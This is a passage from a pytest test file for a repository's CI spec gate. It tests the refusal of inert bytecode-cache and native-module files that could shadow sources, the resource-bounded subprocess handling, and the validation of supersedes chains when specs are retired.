    assert control.returncode==0,control.stdout+control.stderr
    assert all(r.returncode==1 and 'belong to FEAT-CICD-001' in r.stdout for r in results.values()),{p:r.stdout for p,r in results.items()}
    owner=base_checkout_input_pr(repo,ci_branch,{**CODE,slots[0]:inert},PR_TITLE='FEAT-CICD-001: input ownership',PR_BODY=body(spec_path=ci_spec,plan_path=ci_plan))
    assert owner.returncode==0,owner.stdout+owner.stderr
    # Tagged cache without its source cannot initialize this namespace package.
    orphan=base_checkout_input_pr(repo,BRANCH,{**CODE,f'scripts/__pycache__/__init__.{tag}.pyc':inert},**DOCS_OK)
    assert orphan.returncode==0,orphan.stdout+orphan.stderr
    sg=load_gate(repo)
    effective_sources=sources|{'scripts/__init__.py','scripts/gate/spec_gate.py','json.py',
                              'scripts/maintenance/docs_audit.py','tests/scripts/test_doc_source_snapshot.py',
                              'tests/scripts/test_docs_audit.py','tests/scripts/test_spec_gate.py'}
    present=types.SimpleNamespace(mode=lambda path:'100644' if path in effective_sources else None)
    for source in effective_sources:
        for optimization in ('','1','2'):
            cache=importlib.util.cache_from_source(source,optimization=optimization)
            assert sg.is_process_file(cache,(present,present)),cache
        assert sg.is_process_file(source[:-3]+'.abi3.so',(present,present)),source
    assert sg.is_process_file(f'tests/scripts/__pycache__/test_spec_gate.{tag}-pytest-8.3.2.pyc',(present,present))
    assert sg.source_import_shadow(importlib.util.cache_from_source('json.py'),present={'json.py'})
    assert not sg.source_import_shadow(importlib.util.cache_from_source('json.py'),present=set())


def test_effective_renderer_slots_refuse_beside_generated_docs_for_the_owner(inventory_repo):
    """The CICD owner still cannot change effective renderer/init slots alongside generated output."""
    if RENDERER_HERE:
        root,_=inventory_repo;ci_branch='fix/feat-cicd-001-render-inputs';ci_spec='docs/superpowers/specs/2026-09-01-render-inputs.md';ci_plan='docs/superpowers/plans/2026-09-01-render-inputs.md'
        row=CATALOG_TEXT.replace('| [FEAT-DATA-001]','| [FEAT-CICD-001](#feat-cicd-001) | CI | Production | unknown | none |\n| [FEAT-DATA-001]',1)
        on_base(root,{CATALOG:row,ci_spec:spec(feat_id='FEAT-CICD-001'),ci_plan:plan(feat_id='FEAT-CICD-001',spec=ci_spec,branch=ci_branch),'scripts/__init__.py':'# Trusted empty initializer.\n'},then=render)
        change(root,ci_branch,{MAIN_PY:moved_main()},then=render)
        expected={p:(root/p).read_text() for p in (MAIN_PY,*GENERATED)}
        meta=dict(PR_TITLE='FEAT-CICD-001: renderer inputs',PR_BODY=body(spec_path=ci_spec,plan_path=ci_plan)+'\n\n## Capacity\nn/a: native fixture only\n')
        tag=sys.implementation.cache_tag;inert='Inert admission fixture; never imported.\n'
        control=base_checkout_input_pr(root,ci_branch,{**expected,'scripts/maintenance/cache-notes.bin':inert},**meta)
        slots=(f'scripts/maintenance/__pycache__/doc_inventory.{tag}.pyc',f'scripts/maintenance/__pycache__/check_generated_docs.{tag}.opt-2.pyc',f'scripts/maintenance/__pycache__/__init__.{tag}.opt-1.pyc',f'scripts/__pycache__/__init__.{tag}.pyc','scripts/maintenance/check_generated_docs.abi3.so','scripts/maintenance/doc_inventory.pyc')
        results={p:base_checkout_input_pr(root,ci_branch,{**expected,p:inert},**meta) for p in slots}
        assert control.returncode==0,control.stdout+control.stderr
        assert all(refused(r,'which decide the render') for r in results.values()),{p:r.stdout+r.stderr for p,r in results.items()}


def test_effective_slots_include_current_policy_base_source_presence(inventory_repo):
    """Inert cache fork predates trusted BASE's initializer: actual current BASE, HEAD and fork all matter."""
    if RENDERER_HERE:
        root,moved=inventory_repo;ci_branch='fix/feat-cicd-001-current-inputs';ci_spec='docs/superpowers/specs/2026-09-01-current-inputs.md';ci_plan='docs/superpowers/plans/2026-09-01-current-inputs.md'
        row=CATALOG_TEXT.replace('| [FEAT-DATA-001]','| [FEAT-CICD-001](#feat-cicd-001) | CI | Production | unknown | none |\n| [FEAT-DATA-001]',1)
        on_base(root,{CATALOG:row,ci_spec:spec(feat_id='FEAT-CICD-001'),ci_plan:plan(feat_id='FEAT-CICD-001',spec=ci_spec,branch=ci_branch)})
        fork=_git(root,'rev-parse','base');slot=importlib.util.cache_from_source('scripts/__init__.py');inert='Inert source-presence admission fixture; not executable.\n'
        change(root,BRANCH,{**CODE,slot:inert});unrelated=_git(root,'rev-parse','HEAD')
        change(root,ci_branch,{**moved,slot:inert});owner=_git(root,'rev-parse','HEAD')
        change(root,ci_branch,{**moved,'scripts/cache-notes.bin':inert});control=_git(root,'rev-parse','HEAD')
        _git(root,'checkout','-q','-f','main')
        orphan=gate(root,'--pr',fork,unrelated,PR_HEAD_REF=BRANCH,**DOCS_OK)
        assert orphan.returncode==0,orphan.stdout+orphan.stderr
        on_base(root,{'scripts/__init__.py':'# Newly present trusted initializer.\n'})
        current=_git(root,'rev-parse','base');assert _git(root,'merge-base',current,owner)==fork
        refused_owner=gate(root,'--pr',current,unrelated,PR_HEAD_REF=BRANCH,**DOCS_OK)
        meta=dict(PR_HEAD_REF=ci_branch,PR_TITLE='FEAT-CICD-001: current renderer inputs',PR_BODY=body(spec_path=ci_spec,plan_path=ci_plan)+'\n\n## Capacity\nn/a: inert native fixture\n')
        refused_render=gate(root,'--pr',current,owner,**meta)
        accepted=gate(root,'--pr',current,control,**meta)
        assert refused_owner.returncode==1 and 'belong to FEAT-CICD-001' in refused_owner.stdout,refused_owner.stdout
        assert refused(refused_render,'which decide the render'),refused_render.stdout+refused_render.stderr
        assert accepted.returncode==0,accepted.stdout+accepted.stderr


FORMAL_OBSERVER_PROBE = r'''
import ctypes,importlib.util,json,os,pathlib,subprocess,sys,threading,time
s=importlib.util.spec_from_file_location('inventory_budget',sys.argv[1]);m=importlib.util.module_from_spec(s);sys.modules[s.name]=m;s.loader.exec_module(m)
mode=sys.argv[2];native=ctypes.CDLL(None);prior=ctypes.c_int();assert native.prctl(37,ctypes.byref(prior),0,0,0)==0;assert native.prctl(36,0,0,0,0)==0
real_popen=m.subprocess.Popen;real_discover=m.OwnedFamily.discover;real_pidfd=m.os.pidfd_open;real_close=m.os.close;real_snapshot=m.OwnedFamily.snapshot;real_cleanup=m.OwnedFamily.terminate_and_reap;real_run=m.run_bounded
children=[];opened=[];hits=dict(late_error=0,close_error=0,snapshot_error=0);closed=[];release=threading.Event();failed=threading.Event();final_phase=False

def popen(*a,**kw):
 p=real_popen(*a,**kw);children.append(p)
 if mode=='late-error':
  poll=p.poll
  def delayed_poll():
   if not release.is_set():
    p.wait(timeout=1);release.set();assert failed.wait(1)
   return poll()
  p.poll=delayed_poll
 return p
def discover(family,**kw):
 if mode=='late-error' and threading.current_thread() is not threading.main_thread():
  assert release.wait(1);hits['late_error']+=1;failed.set();raise OSError('late actual collector boundary failure')
 return real_discover(family,**kw)
def pidfd(*a,**kw):
 fd=real_pidfd(*a,**kw);opened.append(fd);return fd
def close(fd):
 if final_phase=='ready' and fd in opened:closed.append(fd)
 if mode in ('close-error','persistent-close') and final_phase=='ready' and fd in opened and (mode=='persistent-close' or not hits['close_error']):
  hits['close_error']+=1;raise OSError('actual stopped PIDfd close boundary unavailable once')
 return real_close(fd)
def cleanup(*a,**kw):
 global final_phase
 result=real_cleanup(*a,**kw)
 if final_phase:final_phase='ready'
 else:final_phase=True
 return result
def snapshot(family):
 if mode=='snapshot-error' and final_phase=='ready' and not hits['snapshot_error']:
  hits['snapshot_error']+=1;raise OSError('final ownership snapshot boundary unavailable once')
 return real_snapshot(family)
m.subprocess.Popen=popen;m.OwnedFamily.discover=discover;m.os.pidfd_open=pidfd;m.os.close=close;m.OwnedFamily.terminate_and_reap=cleanup;m.OwnedFamily.snapshot=snapshot
result={}
try:
 try:
  if mode=='main':
   codes=[];paths=[];times=[]
   time.sleep(.35)
   for index in range(2):
    path=pathlib.Path(f'public-{index}.json');started=time.monotonic();codes.append(m.main(['--max-seconds','.3','--max-rss-mib','1','--output',str(path)]));times.append(time.monotonic()-started);paths.append(json.loads(path.read_text()) if path.exists() else None)
   result.update(codes=codes,public_reports=paths,invocation_seconds=times)
  else:
   if mode=='accepted':
    result['prior_high_report']=m.run_bounded([sys.executable,'-c','import time;x=bytearray(96*1024*1024);time.sleep(.02)'],pathlib.Path.cwd(),max_rss_bytes=256*1024*1024,max_seconds=2)
   report=m.run_bounded([sys.executable,'-c','import time;time.sleep(.02)'],pathlib.Path.cwd(),max_rss_bytes=(64 if mode=='accepted' else 128)*1024*1024,max_seconds=1)
   result['report']=report
   if mode=='persistent-close':
    before=len(children);result['second_report']=m.run_bounded([sys.executable,'-c','pass'],pathlib.Path.cwd(),max_rss_bytes=128*1024*1024,max_seconds=1);result['no_second_spawn']=len(children)==before;result['retained_reachable']=m.RETAINED_OWNERSHIP is not None
  result['escaped_exception']=None
 except Exception as e:result['escaped_exception']=type(e).__name__+': '+str(e)
 state=ctypes.c_int();assert native.prctl(37,ctypes.byref(state),0,0,0)==0
 leaked=[]
 for fd in opened:
  try:os.fstat(fd);leaked.append(fd)
  except OSError:pass
 result.update(hits=hits,children_created=len(children),native_children_alive=[p.pid for p in children if p.poll() is None],opened_pidfds=len(opened),live_pidfds=leaked,subreaper_after=state.value,owned_fd_close_attempts=closed)
finally:
 m.subprocess.Popen=real_popen;m.OwnedFamily.discover=real_discover;m.os.pidfd_open=real_pidfd;m.os.close=real_close;m.OwnedFamily.snapshot=real_snapshot;m.OwnedFamily.terminate_and_reap=real_cleanup;m.run_bounded=real_run
 for p in children:
  if p.poll() is None:p.kill()
  p.wait()
 for fd in opened:
  try:real_close(fd)
  except OSError:pass
 native.prctl(36,prior.value,0,0,0)
print('FORMAL_RESULT='+json.dumps(result))
'''


def test_measure_inventory_render_preserves_formal_review_terminal_invariants(tmp_path):
    """Actual collector/close/snapshot boundaries and repeated imported public calls cannot report false success."""
    results={}
    for mode in ('accepted','late-error','close-error','snapshot-error','main'):
        path=tmp_path/mode;path.mkdir()
        scratch=path/'tmp';scratch.mkdir()   # monitor scratch roots stay inside this test's tmp_path
        r=subprocess.run([sys.executable,'-c',FORMAL_OBSERVER_PROBE,str(REPO/MEASURE),mode],cwd=path,env={**os.environ,'TMPDIR':str(scratch)},
                         capture_output=True,text=True,timeout=5)
        assert r.returncode==0,(mode,r.stdout,r.stderr)
        results[mode]=json.loads(next(line[len('FORMAL_RESULT='):] for line in r.stdout.splitlines() if line.startswith('FORMAL_RESULT=')))
    (tmp_path/'formal-terminal-results.json').write_text(json.dumps(results,indent=2))
    assert all(x['escaped_exception'] is None and not x['native_children_alive'] and not x['live_pidfds'] and x['subreaper_after']==0 for x in results.values()),results
    assert all(x['children_created']>0 and x['opened_pidfds']>0 for name,x in results.items() if name!='main'),results
    assert results['accepted']['report']['ok'] and results['accepted']['prior_high_report']['ok'],results
    low=results['accepted']['report']
    assert low['peak_rss_bytes']<64*1024*1024<low['kernel_child_peak_bytes'] and low['kernel_child_peak_before_bytes']>=64*1024*1024 and low['kernel_child_peak_scope']=='process-lifetime cumulative; diagnostic only',results
    for mode,key in (('late-error','late_error'),('close-error','close_error'),('snapshot-error','snapshot_error')):
        assert results[mode]['hits'][key]==1 and not results[mode]['report']['ok'],results
    assert results['main']['codes']==[1,1] and all(x and not x['ok'] and x['reason']=='rss_limit' and 0<x['elapsed_before_emission_seconds']<.3 for x in results['main']['public_reports']),results


# ---------------------------------------------------------------------------------------------
# FEAT-CICD-001 spec 2026-10-31-feat-cicd-001-supersedes-chain-retirement: the status-only
# retirement of a spec that itself superseded one, and validation of the whole supersedes lineage.
# Fixture lineage (spec, "Acceptance fixtures"): Q = SPEC (superseded), P names Q, N names P.
# ---------------------------------------------------------------------------------------------

P_SPEC = "docs/superpowers/specs/2026-09-02-model-decisions-v2.md"
N_SPEC = "docs/superpowers/specs/2026-09-03-model-decisions-v3.md"
R_SPEC = "docs/superpowers/specs/2026-08-30-model-decisions-v0.md"
D_SPEC = "docs/superpowers/specs/2026-09-04-model-decisions-draft.md"
ROUND_EIGHT = "which is already superseded; name the spec that replaced it (round eight)"
REDUNDANT = "already superseded on the current base; merge main, resolve any remaining differences, and rerun the gate"
RETIRE_BRANCH = "docs/spec-feat-model-001-v3"


def retirement_lineage(repo: Path, **extra: str | None) -> None:
    """Q (SPEC) superseded with a null pointer; P approved, naming Q; plus `extra` files, on the base."""
    on_base(repo, {SPEC: spec(status="superseded"), P_SPEC: spec(supersedes=SPEC), **extra})


def flipped_p(**over) -> str:
    """P with only its status line changed, as the retirement edit writes it."""
    return spec(status="superseded", supersedes=SPEC, **over)


def divergent_pr(repo: Path, branch: str, branch_files: dict[str, str | None], main_files: dict[str, str | None],
                 **env: str) -> subprocess.CompletedProcess:
    """A branch cut from `base` whose head keeps the old merge base while main advances (the shape of
    test_policy_documents_are_read_at_the_current_base): policy is read at the advanced tip."""
    _git(repo, "reset", "-q", "--hard")
    _git(repo, "clean", "-qfd")
    _git(repo, "checkout", "-q", "-B", branch, "base")
    for path, text in branch_files.items():
        if text is None:
            (repo / path).unlink()
        else:
            write(repo, path, text)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", f"change on {branch}")
    head = _git(repo, "rev-parse", "HEAD")
    on_base(repo, main_files)
    return gate(repo, "--pr", _git(repo, "rev-parse", "base"), head, **{"PR_HEAD_REF": branch, **env})


def test_depth_two_retirement_pr_mode_admits_status_only_flip_with_approved_replacement(repo):
    """Spec done_when[0], A1 and C4. The #1649 shape: N added and P flipped status-only in one PR; main
    refuses it with the round-eight message although the in-place rule admits exactly this edit."""
    retirement_lineage(repo)
    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: flipped_p()})
    assert r.returncode == 0 and ROUND_EIGHT not in r.stdout, r.stdout
    # C4: an unrelated approved spec lands on main after the fork; policy is read at the advanced tip and P is still approved there
    other = "docs/superpowers/specs/2026-09-05-data-other.md"
    r = divergent_pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: flipped_p()},
                     {other: spec(feat_id="FEAT-DATA-001", req_ids="[REQ-DATA-001]")})
    assert r.returncode == 0 and ROUND_EIGHT not in r.stdout, r.stdout


def test_depth_two_retirement_commit_mode_admits_status_only_flip(repo):
    """Spec done_when[0], A2 and A3: N and P staged in one commit; then N committed first and P flipped next."""
    retirement_lineage(repo)
    _git(repo, "checkout", "-q", "-B", RETIRE_BRANCH, "base")
    write(repo, N_SPEC, spec(supersedes=P_SPEC))
    write(repo, P_SPEC, flipped_p())
    _git(repo, "add", "-A")
    r = gate(repo, "--commit")
    assert r.returncode == 0 and ROUND_EIGHT not in r.stdout, r.stdout
    _git(repo, "reset", "-q", "--hard")
    _git(repo, "checkout", "-q", "-B", RETIRE_BRANCH, "base")
    write(repo, N_SPEC, spec(supersedes=P_SPEC))
    _git(repo, "add", "-A")
    assert gate(repo, "--commit").returncode == 0
    _git(repo, "commit", "-q", "-m", "v3 names v2")
    write(repo, P_SPEC, flipped_p())
    _git(repo, "add", "-A")
    r = gate(repo, "--commit")
    assert r.returncode == 0 and ROUND_EIGHT not in r.stdout, r.stdout


def test_longer_chain_retirement_passes_and_traversal_terminates(repo):
    """Spec done_when[0], A4: R superseded (null), Q superseded names R, P approved names Q; N added, P flipped."""
    on_base(repo, {R_SPEC: spec(status="superseded"), SPEC: spec(status="superseded", supersedes=R_SPEC), P_SPEC: spec(supersedes=SPEC)})
    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: flipped_p()})
    assert r.returncode == 0 and "spec gate ok" in r.stdout and "chain" not in r.stdout, r.stdout


def test_new_pointer_to_superseded_target_still_refused(repo):
    """Spec done_when[1], B1 and B2: a new or changed pointer at an already-superseded target keeps the round-eight refusal."""
    retirement_lineage(repo, **{D_SPEC: spec(status="draft")})
    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=SPEC)})
    assert r.returncode == 1 and f"{N_SPEC}: supersedes {SPEC}, {ROUND_EIGHT}" in r.stdout, r.stdout
    r = pr(repo, RETIRE_BRANCH, {D_SPEC: spec(status="draft", supersedes=SPEC)})
    assert r.returncode == 1 and f"{D_SPEC}: supersedes {SPEC}, {ROUND_EIGHT}" in r.stdout, r.stdout


def test_draft_to_approved_with_stale_pointer_refused(repo):
    """Spec done_when[1], B3: approving a draft in place whose unchanged pointer names a superseded spec is not the exempt edit."""
    retirement_lineage(repo, **{D_SPEC: spec(status="draft", supersedes=SPEC)})
    r = pr(repo, RETIRE_BRANCH, {D_SPEC: spec(supersedes=SPEC)})
    assert r.returncode == 1 and f"{D_SPEC}: supersedes {SPEC}, {ROUND_EIGHT}" in r.stdout, r.stdout


def test_flip_with_changed_pointer_refused(repo):
    """Spec done_when[1], B4: a flip that also moves the pointer is refused in place and by round eight."""
    retirement_lineage(repo, **{R_SPEC: spec(status="superseded")})
    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: spec(status="superseded", supersedes=R_SPEC)})
    assert r.returncode == 1 and f"{P_SPEC}: an approved spec does not change in place" in r.stdout, r.stdout
    assert f"{P_SPEC}: supersedes {R_SPEC}, {ROUND_EIGHT}" in r.stdout, r.stdout


def test_flip_without_valid_replacement_refused_both_ways(repo):
    """Spec done_when[1], B5: no N, a draft N, or another FEAT's N leaves the flip refused (PR and commit modes)."""
    retirement_lineage(repo)
    missing = f"{P_SPEC}: marked superseded, but no approved spec for its FEAT names it in `supersedes`"
    for files in ({P_SPEC: flipped_p()},
                  {P_SPEC: flipped_p(), N_SPEC: spec(status="draft", supersedes=P_SPEC)},
                  {P_SPEC: flipped_p(), N_SPEC: spec(feat_id="FEAT-DATA-001", req_ids="[REQ-DATA-001]", supersedes=P_SPEC)}):
        r = pr(repo, RETIRE_BRANCH, files)
        assert r.returncode == 1 and missing in r.stdout and f"{P_SPEC}: supersedes {SPEC}, {ROUND_EIGHT}" in r.stdout, (files, r.stdout)
        _git(repo, "checkout", "-q", "-B", RETIRE_BRANCH, "base")
        for path, text in files.items():
            write(repo, path, text)
        _git(repo, "add", "-A")
        r = gate(repo, "--commit")
        assert r.returncode == 1 and missing in r.stdout, (files, r.stdout)
        _git(repo, "reset", "-q", "--hard")


def test_extra_predecessor_bytes_refused(repo):
    """Spec done_when[1], B6: the enumerated byte changes beyond the status line in P (a done_when word, trailing
    whitespace, CRLF, a changed blank line) leave the exemption unreached, with today's messages; the status line
    itself is covered by test_flip_changes_only_the_status_entry_and_hides_no_key. The gate reads text with CRLF folded, so
    the in-place rule does not see the CRLF variant on main or here; it is refused by round eight on both (executed
    against main a79ac45d: round eight alone), and the exemption judges the bytes so the flip is not admitted."""
    retirement_lineage(repo)
    base_flip = flipped_p()
    variants = {
        "done_when word": flipped_p(done_when=["something easier", DONE[1]]),
        "trailing whitespace": base_flip.replace("# Body\n", "# Body \n", 1),
        "CRLF": base_flip.replace("\n", "\r\n"),
        "changed blank line": base_flip.replace("---\n\n# Body", "---\n\n\n# Body", 1),
    }
    for label, text in variants.items():
        assert text != base_flip, label
        r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: text})
        assert r.returncode == 1, (label, r.stdout)
        assert f"{P_SPEC}: supersedes {SPEC}, {ROUND_EIGHT}" in r.stdout, (label, r.stdout)
        if label != "CRLF":
            assert f"{P_SPEC}: an approved spec does not change in place" in r.stdout, (label, r.stdout)


def test_inherited_invalid_own_pointer_refused_on_flip(repo):
    """Spec done_when[2], B7 (baseline control): P's own inherited pointer is bad; today's L1512 to L1518 messages hold."""
    missing_q = "docs/superpowers/specs/2026-08-01-model-gone.md"
    for pointer, message in ((missing_q, "which is not a spec on the base"),
                             ("./" + SPEC, "which is not a spec on the base"),
                             ("docs/superpowers/specs/2026-08-02-data-q.md", "a spec for FEAT-DATA-001, not FEAT-MODEL-001")):
        extra = {"docs/superpowers/specs/2026-08-02-data-q.md": spec(feat_id="FEAT-DATA-001", req_ids="[REQ-DATA-001]")}
        on_base(repo, {SPEC: spec(status="superseded"), P_SPEC: spec(supersedes=pointer), **extra})
        r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: spec(status="superseded", supersedes=pointer)})
        assert r.returncode == 1 and f"{P_SPEC}: supersedes" in r.stdout and message in r.stdout, (pointer, r.stdout)


def test_deeper_inherited_edge_refused(repo):
    """Spec done_when[2], B7b: Q's own pointer (the second edge) is noncanonical, missing or cross-FEAT. Main refuses the
    fixture only by round eight on P's pointer and never examines Q's edge; the chain messages name the defect."""
    data_r = "docs/superpowers/specs/2026-08-02-data-r.md"
    missing_r = "docs/superpowers/specs/2026-08-01-model-gone.md"
    cases = (
        ("./" + R_SPEC, {R_SPEC: spec(status="superseded")},
         f"{P_SPEC}: supersedes chain reaches {'./' + R_SPEC!r}, which is not written as docs/superpowers/specs/<file>.md"),
        (missing_r, {}, f"{P_SPEC}: supersedes chain breaks at {missing_r}, which is not a spec on the base"),
        (data_r, {data_r: spec(feat_id="FEAT-DATA-001", req_ids="[REQ-DATA-001]", status="superseded")},
         f"{P_SPEC}: supersedes chain reaches {data_r}, a spec for FEAT-DATA-001, not FEAT-MODEL-001"),
    )
    for q_pointer, extra, message in cases:
        on_base(repo, {SPEC: spec(status="superseded", supersedes=q_pointer), P_SPEC: spec(supersedes=SPEC), **extra})
        r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: flipped_p()})
        assert r.returncode == 1 and message in r.stdout, (q_pointer, r.stdout)


def test_deleted_ancestor_is_not_read_from_base(repo):
    """Spec done_when[2], B7c and C6: the change flips P beside N and deletes Q; the chain refuses at Q as deleted
    (never falling back to the base copy) beside the existing deletion refusal."""
    retirement_lineage(repo)
    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: flipped_p(), SPEC: None})
    assert r.returncode == 1 and f"{SPEC}: a superseded spec is not deleted" in r.stdout, r.stdout
    assert f"{P_SPEC}: supersedes chain breaks at {SPEC}, which this change deletes" in r.stdout, r.stdout


def test_supersedes_cycle_refused(repo):
    """Spec done_when[3], B8 to B11: a self-cycle, a two-spec cycle in one change, a cycle closed against the base and a
    draft-level cycle are each refused with the revisits message (main has no cycle check; B11 passes there)."""
    n2 = "docs/superpowers/specs/2026-09-06-model-decisions-v4.md"
    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=N_SPEC)})
    assert r.returncode == 1 and f"{N_SPEC}: supersedes chain revisits {N_SPEC} (cycle)" in r.stdout, r.stdout
    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=n2), n2: spec(supersedes=N_SPEC)})
    assert r.returncode == 1 and f"{N_SPEC}: supersedes chain revisits {N_SPEC} (cycle)" in r.stdout, r.stdout
    assert f"{n2}: supersedes chain revisits {n2} (cycle)" in r.stdout, r.stdout
    a, b = P_SPEC, N_SPEC
    on_base(repo, {a: spec(supersedes=b), b: spec()})
    r = pr(repo, RETIRE_BRANCH, {b: spec(supersedes=a)})
    assert r.returncode == 1 and f"{b}: supersedes chain revisits {b} (cycle)" in r.stdout, r.stdout
    on_base(repo, {a: spec(status="draft", supersedes=b), b: spec(status="draft")})
    r = pr(repo, RETIRE_BRANCH, {b: spec(status="draft", supersedes=a)})
    assert r.returncode == 1 and f"{b}: supersedes chain revisits {b} (cycle)" in r.stdout, r.stdout


def test_simultaneous_draft_edit_cycle_uses_head_value(repo):
    """Spec done_when[3], B11b: N (new) names draft D while the same change points D at N; the overlay reads D's staged
    pointer, so the cycle is found from N and from D."""
    on_base(repo, {D_SPEC: spec(status="draft")})
    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=D_SPEC), D_SPEC: spec(status="draft", supersedes=N_SPEC)})
    assert r.returncode == 1 and f"{N_SPEC}: supersedes chain revisits {N_SPEC} (cycle)" in r.stdout, r.stdout
    assert f"{D_SPEC}: supersedes chain revisits {D_SPEC} (cycle)" in r.stdout, r.stdout


def test_redundant_flip_after_base_advance_gets_merge_main_diagnostic(repo):
    """Spec done_when[4], row C1 (BA1, P supersedes Q; replaces the companion plan's C1 row): main retired P after the
    fork and the branch's P equals the current base's P, so the step 5 refusal appears beside the round-eight refusal
    that still applies to N's pointer. Its text promises no merge result."""
    retirement_lineage(repo)
    n2 = "docs/superpowers/specs/2026-09-06-model-decisions-v4.md"
    r = divergent_pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: flipped_p()},
                     {n2: spec(supersedes=P_SPEC), P_SPEC: flipped_p()})
    assert r.returncode == 1 and f"{P_SPEC}: {REDUNDANT}" in r.stdout, r.stdout
    assert f"{N_SPEC}: supersedes {P_SPEC}, {ROUND_EIGHT}" in r.stdout, r.stdout


def test_pointer_to_target_superseded_after_fork_refused(repo):
    """Spec done_when[4], C2 (BA2, baseline control): N's pointer is new and P is superseded at the current base."""
    retirement_lineage(repo)
    n2 = "docs/superpowers/specs/2026-09-06-model-decisions-v4.md"
    r = divergent_pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC)}, {n2: spec(supersedes=P_SPEC), P_SPEC: flipped_p()})
    assert r.returncode == 1 and f"{N_SPEC}: supersedes {P_SPEC}, {ROUND_EIGHT}" in r.stdout, r.stdout


def test_merge_of_main_carrying_the_flip_is_not_rechecked(repo):
    """Spec done_when[4], C3 (BA3, baseline control): a merge of main in progress brings the flip of P; measured against
    MERGE_HEAD, P is not in the change and is not re-checked."""
    retirement_lineage(repo)
    n2 = "docs/superpowers/specs/2026-09-06-model-decisions-v4.md"
    _git(repo, "checkout", "-q", "-B", RETIRE_BRANCH, "base")
    write(repo, "docs/notes.md", "notes\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "branch work")
    on_base(repo, {n2: spec(supersedes=P_SPEC), P_SPEC: flipped_p()})
    _git(repo, "checkout", "-q", RETIRE_BRANCH)
    _git(repo, "merge", "-q", "--no-commit", "--no-ff", "main")
    assert (repo / ".git/MERGE_HEAD").exists()
    r = gate(repo, "--commit")
    assert r.returncode == 0 and ROUND_EIGHT not in r.stdout and P_SPEC not in r.stdout, r.stdout


def test_unchanged_ancestry_is_read_at_the_current_base(repo):
    """Spec done_when[4], C5 (BA5, baseline control): draft D names approved Q at the fork; main retires Q; approving D
    in place is refused by round eight because Q is read at the current base, never the merge base."""
    q2 = "docs/superpowers/specs/2026-09-06-model-decisions-q2.md"
    on_base(repo, {D_SPEC: spec(status="draft", supersedes=SPEC)})
    r = divergent_pr(repo, RETIRE_BRANCH, {D_SPEC: spec(supersedes=SPEC)}, {q2: spec(supersedes=SPEC), SPEC: spec(status="superseded")})
    assert r.returncode == 1 and f"{D_SPEC}: supersedes {SPEC}, {ROUND_EIGHT}" in r.stdout, r.stdout


def test_unrelated_draft_edit_beside_retirement_passes(repo):
    """Spec done_when[5], A8: an unrelated draft's text edit rides beside N and the flip of P; its empty lineage and N's
    lineage (N, P, Q, null) both pass."""
    retirement_lineage(repo, **{D_SPEC: spec(status="draft")})
    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: flipped_p(), D_SPEC: spec(status="draft") + "\nmore words\n"})
    assert r.returncode == 0, r.stdout


def test_retirement_leaves_done_plans_unbound_and_untouched(repo):
    """Spec done_when[5], B15: a done plan on the base cites P; a docs/ branch retirement reads, rebinds and reports no plan."""
    done_plan = "docs/superpowers/plans/2026-09-02-model-decisions-v2.md"
    retirement_lineage(repo, **{done_plan: plan(spec=P_SPEC, branch="feature/feat-model-001-v2", status="done", pr=7)})
    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: flipped_p()})
    assert r.returncode == 0 and "plan" not in r.stdout, r.stdout
    assert _git(repo, "show", f"HEAD:{done_plan}") == plan(spec=P_SPEC, branch="feature/feat-model-001-v2", status="done", pr=7).strip()


def test_traversal_bound_on_sixty_chained_specs(repo):
    """Spec done_when[6], D2 and D3: sixty chained specs; the chain walk makes at most one tree read per distinct spec in
    the union of the head and base spec lists, the gate run completes, and --check-spec runs no chain check."""
    chain = [f"docs/superpowers/specs/2026-07-{1 + i // 31:02d}-model-chain-{i:02d}.md" for i in range(60)]
    files = {chain[0]: spec(status="superseded")}
    for prev, cur in zip(chain, chain[1:-1]):
        files[cur] = spec(status="superseded", supersedes=prev)
    files[chain[-1]] = spec(supersedes=chain[-2])
    on_base(repo, files)
    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=chain[-1]), chain[-1]: spec(status="superseded", supersedes=chain[-2])})
    assert r.returncode == 0 and "spec gate ok" in r.stdout, r.stdout
    sg = load_gate(repo)
    base, head = base_and_head(repo)
    changed = _git(repo, "diff", "--name-only", "--no-renames", base, head).splitlines()
    ch = sg.Change("pr", RETIRE_BRANCH, changed, sg.Tree(head), sg.Tree(base), sg.Tree(base))
    reads: list[str] = []
    real_read = sg.Tree.read
    try:
        sg.Tree.read = lambda self, path: (reads.append(path), real_read(self, path))[1]
        errs = sg.check_chain(sg.frontmatter(real_read(sg.Tree(head), N_SPEC)), N_SPEC, ch)
    finally:
        sg.Tree.read = real_read
    distinct = set(sg.Tree(head).list(sg.SPECS)) | set(sg.Tree(base).list(sg.SPECS))
    assert errs == [] and 0 < len(reads) <= len(distinct) and len(set(reads)) == len(reads), (len(reads), len(distinct))
    r = gate(repo, "--check-spec", N_SPEC)
    assert r.returncode == 0 and r.stdout.strip() == "spec ok", r.stdout


def test_crlf_relabel_of_a_superseded_spec_is_not_called_redundant(repo):
    """IMPL-CICD1 R1 F1, under the replacement spec's step 5: P is already superseded at the merge base, so a CRLF
